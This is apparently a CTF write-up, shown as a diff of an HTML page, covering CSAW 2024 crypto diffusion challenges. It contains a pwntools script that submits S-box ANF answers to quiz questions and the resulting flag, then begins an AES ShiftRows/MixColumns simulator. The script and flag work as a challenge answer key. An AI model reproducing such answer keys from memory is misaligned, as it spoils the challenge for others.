+<span style="color: #75715e"># SBOX = sbox1</span>
+<span style="color: #75715e"># BIT = 3</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x8+x7+x6+x5+x5*x6+x5*x6*x8+x5*x6*x7*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7*x8+x4*x5*x7*x8+x4*x5*x6*x8+x3*x7+x3*x7*x8+x3*x6+x3*x6*x7+x3*x6*x7*x8+x3*x5*x7+x3*x5*x6*x8+x3*x5*x6*x7*x8+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x7*x8+x3*x4*x6+x3*x4*x6*x7+x3*x4*x6*x7*x8+x3*x4*x5*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x8+x2*x4+x2*x4*x7*x8+x2*x4*x6*x7+x2*x4*x5*x8+x2*x4*x5*x6+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7+x2*x3+x2*x3*x8+x2*x3*x7+x2*x3*x7*x8+x2*x3*x6*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x7+x2*x3*x5*x6+x2*x3*x4+x2*x3*x4*x8+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5*x7+x1*x8+x1*x7+x1*x7*x8+x1*x6+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5+x1*x5*x8+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x7*x8+x1*x4*x6+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5+x1*x4*x5*x8+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x5*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x8+x1*x3*x4*x5*x6*x7*x8+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x7*x8+x1*x2*x6+x1*x2*x6*x8+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5+x1*x2*x5*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6+x1*x2*x5*x6*x8+x1*x2*x5*x6*x7+x1*x2*x5*x6*x7*x8+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 7</span>
+
+<span style="color: #75715e"># Here we get asked what input bits is the previous answer dependet on.</span>
+<span style="color: #75715e"># To which the answer is all of them</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x1,x2,x3,x4,x5,x6,x7,x8&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 8</span>
+
+<span style="color: #75715e"># Here we get asked if output bit 3 of sbox1 (i.e. answer to Question 6) achieve complete diffusion with respect to the input bits. Which it does since it depends on all input bits.</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 9</span>
+
+<span style="color: #75715e"># Similar to Question 6</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x7*x8+x6+x6*x7*x8+x5*x7+x5*x6+x5*x6*x7+x4*x7+x4*x6*x7+x4*x6*x7*x8+x4*x5+x4*x5*x7+x4*x5*x6*x8+x4*x5*x6*x7+x3+x3*x7*x8+x3*x6*x7+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x6*x8+x3*x4*x6*x7+x3*x4*x5+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7*x8+x2*x6*x8+x2*x6*x7+x2*x6*x7*x8+x2*x5+x2*x5*x8+x2*x5*x7*x8+x2*x4+x2*x4*x8+x2*x4*x6+x2*x4*x6*x8+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7*x8+x2*x3*x7+x2*x3*x6+x2*x3*x6*x7*x8+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x8+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x7+x2*x3*x4*x5*x7+x2*x3*x4*x5*x7*x8+x2*x3*x4*x5*x6*x8+x2*x3*x4*x5*x6*x7+x1*x7+x1*x7*x8+x1*x6*x8+x1*x5+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4*x7*x8+x1*x4*x6*x7+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3+x1*x3*x8+x1*x3*x7+x1*x3*x7*x8+x1*x3*x6*x8+x1*x3*x5*x7+x1*x3*x5*x6+x1*x3*x5*x6*x7+x1*x3*x5*x6*x7*x8+x1*x3*x4+x1*x3*x4*x8+x1*x3*x4*x7+x1*x3*x4*x7*x8+x1*x3*x4*x6+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x7+x1*x3*x4*x5*x6+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x6+x1*x2*x5*x6*x7*x8+x1*x2*x4*x7*x8+x1*x2*x4*x6*x8+x1*x2*x4*x5+x1*x2*x4*x5*x7+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3+x1*x2*x3*x8+x1*x2*x3*x6*x7+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x8+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 10</span>
+
+<span style="color: #75715e"># Similar to Question 7</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x1,x2,x3,x4,x5,x6,x7,x8&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 11</span>
+
+<span style="color: #75715e"># Similar to Question 8</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 12</span>
+
+<span style="color: #75715e"># Similar to Question 6</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x8+x7+x6*x8+x5*x8+x5*x7*x8+x5*x6+x5*x6*x8+x4*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7+x4*x5+x4*x5*x8+x4*x5*x7+x4*x5*x7*x8+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3+x3*x8+x3*x7*x8+x3*x6*x8+x3*x6*x7+x3*x6*x7*x8+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6*x8+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x8+x3*x4*x7+x3*x4*x6+x3*x4*x6*x7*x8+x3*x4*x5+x3*x4*x5*x6*x7+x3*x4*x5*x6*x7*x8+x2*x8+x2*x7*x8+x2*x6*x7+x2*x5*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x7+x2*x5*x6*x7*x8+x2*x4*x8+x2*x4*x7*x8+x2*x4*x6*x8+x2*x4*x5+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3+x2*x3*x7+x2*x3*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5+x2*x3*x4*x5*x7+x2*x3*x4*x5*x6*x8+x1+x1*x8+x1*x7*x8+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5*x8+x1*x5*x7+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5*x8+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7*x8+x1*x3*x8+x1*x3*x7+x1*x3*x6*x7+x1*x3*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x4*x7+x1*x3*x4*x6+x1*x3*x4*x6*x7+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x7+x1*x2+x1*x2*x8+x1*x2*x6+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6*x7+x1*x2*x4+x1*x2*x4*x7*x8+x1*x2*x4*x6+x1*x2*x4*x6*x7+x1*x2*x4*x5*x7+x1*x2*x4*x5*x7*x8+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x7+x1*x2*x3*x6+x1*x2*x3*x6*x8+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7+x1*x2*x3*x5*x7*x8+x1*x2*x3*x5*x6+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7*x8+x1*x2*x3*x4+x1*x2*x3*x4*x8+x1*x2*x3*x4*x7+x1*x2*x3*x4*x7*x8+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6+x1*x2*x3*x4*x5*x6*x8+x1*x2*x3*x4*x5*x6*x7&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 13</span>
+
+<span style="color: #75715e"># Similar to Question 7</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x1,x2,x3,x4,x5,x6,x7,x8&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 14</span>
+
+<span style="color: #75715e"># Similar to Question 8</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 15</span>
+
+<span style="color: #75715e"># Here we get asked if sbox1 has complete diffusion. It does not, for output bit y7 is not dependent on input bit x1</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;no&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 16</span>
+
+<span style="color: #75715e"># Follow up to the previous question, we are asked which output bit from sbox1 is the problem. As stated previously it&#39;s y7.</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;y7&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 17</span>
+
+<span style="color: #75715e"># And here we&#39;re asked what is the ANF for output bit 7 of sbox1</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x7+x6+x6*x8+x5*x8+x5*x6+x4*x8+x4*x7+x4*x7*x8+x4*x6*x7+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3*x7+x3*x6+x3*x6*x7+x3*x5+x3*x5*x6+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x6*x8+x3*x4*x6*x7*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x2*x8+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7+x2*x5*x6+x2*x5*x6*x8+x2*x4*x8+x2*x4*x6+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3*x8+x2*x3*x6*x8+x2*x3*x6*x7*x8+x2*x3*x5*x7+x2*x3*x5*x6*x8+x2*x3*x4&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 18</span>
+
+<span style="color: #75715e"># Contonuing from the few previous questions we&#39;re asked which input bit is missing from the ANF of output bit 7 of sbox1</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;x1&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 19</span>
+
+<span style="color: #75715e"># Here we get asked if sbox2 has complete diffusion</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Question 20</span>
+
+<span style="color: #75715e"># Here we get asked if sbox3 has complete diffusion</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Sending answer for question&quot;</span><span style="color: #f8f8f2">,curQuestion)</span>
+<span style="color: #f8f8f2">curQuestion</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">1</span>
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendline(</span><span style="color: #e6db74">&quot;yes&quot;</span><span style="color: #f8f8f2">)</span>
+
+<span style="color: #75715e"># Finally the flag</span>
+
+<span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">0.2</span><span style="color: #f8f8f2">)</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">5</span><span style="color: #f8f8f2">):</span>
+	<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recvline)</span>
+
+
+<span style="color: #f8f8f2">r</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">interactive()</span>
+</pre></div>
+
+
+
+
+
+<p></p>
+<div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span> <span style="color: #e6db74">&quot;csawctf{hopefu11y_+he_know1ed9e_diffu5ed_in+o_your_6r@in5}&quot;</span>
+</pre></div>
+<p></p>
+
+<hr style="border-top:1px solid #28323C;">
+<p></p>
+<p><h3>AES Diffusion</h3></p>
+<img class="center" src="/assets/images/csaw24AES.png">
+<p></p>
+<p>Much like the previous challenge we're given a python file and a url to connecto to the challenge server. This time we're given a simulator for AES:</p>
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">N_ROWS</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">4</span>
+<span style="color: #f8f8f2">N_COLS</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">4</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">CyclicShift</span><span style="color: #f8f8f2">(row,</span> <span style="color: #f8f8f2">shift):</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">row[shift:]</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">row[:shift]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">ShiftRows</span><span style="color: #f8f8f2">(state):</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">row_index</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(N_ROWS):</span>
+        <span style="color: #f8f8f2">state[row_index]</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">CyclicShift(state[row_index],</span> <span style="color: #f8f8f2">row_index)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">state</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">BuildExpressionString</span><span style="color: #f8f8f2">(column,</span> <span style="color: #f8f8f2">matrix_row):</span>
+    <span style="color: #f8f8f2">expression</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;(&quot;</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">(i,coefficient)</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">enumerate(matrix_row):</span>
+        <span style="color: #f8f8f2">term</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">str(coefficient)</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;*&quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">column[i]</span>
+        <span style="color: #f8f8f2">should_insert_plus</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">&lt;</span> <span style="color: #f8f8f2">len(matrix_row)</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span>
+        <span style="color: #f8f8f2">expression</span> <span style="color: #f92672">+=</span> <span style="color: #f8f8f2">term</span>
+        
+        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">should_insert_plus:</span>
+            <span style="color: #f8f8f2">expression</span> <span style="color: #f92672">+=</span> <span style="color: #e6db74">&quot; + &quot;</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">expression</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&quot;)&quot;</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">GetStateColumn</span><span style="color: #f8f8f2">(state,</span> <span style="color: #f8f8f2">column_index):</span>
+    <span style="color: #f8f8f2">column</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">row</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">state:</span>
+        <span style="color: #f8f8f2">column</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(row[column_index])</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">column</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">MultiplyColumn</span><span style="color: #f8f8f2">(column):</span>
+    <span style="color: #f8f8f2">matrix</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[</span>
+                <span style="color: #f8f8f2">[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span>
+                <span style="color: #f8f8f2">[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span>
+                <span style="color: #f8f8f2">[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">],</span>
+                <span style="color: #f8f8f2">[</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]</span>
+            <span style="color: #f8f8f2">]</span>
+    
+    <span style="color: #f8f8f2">new_column</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">row</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">matrix:</span>
+        <span style="color: #f8f8f2">new_element</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">BuildExpressionString(column,</span> <span style="color: #f8f8f2">row)</span>
+        <span style="color: #f8f8f2">new_column</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(new_element)</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">new_column</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">MixColumns</span><span style="color: #f8f8f2">(state):</span>
+    <span style="color: #f8f8f2">new_columns</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">column_index</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(N_COLS):</span>
+        <span style="color: #f8f8f2">column</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">GetStateColumn(state,</span> <span style="color: #f8f8f2">column_index)</span>
+        <span style="color: #f8f8f2">new_column</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">MultiplyColumn(column)</span>
+        <span style="color: #f8f8f2">new_columns</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(new_column)</span>
+    
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">Transpose(new_columns)</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">Transpose</span><span style="color: #f8f8f2">(matrix):</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">[[matrix[j][i]</span> <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">j</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(len(matrix))]</span> <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(len(matrix[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]))]</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">PrettyPrint</span><span style="color: #f8f8f2">(matrix):</span>
+    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">row</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">matrix:</span>
+        <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(row)</span>
+
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">PrettyPrint2</span><span style="color: #f8f8f2">(matrix):</span>
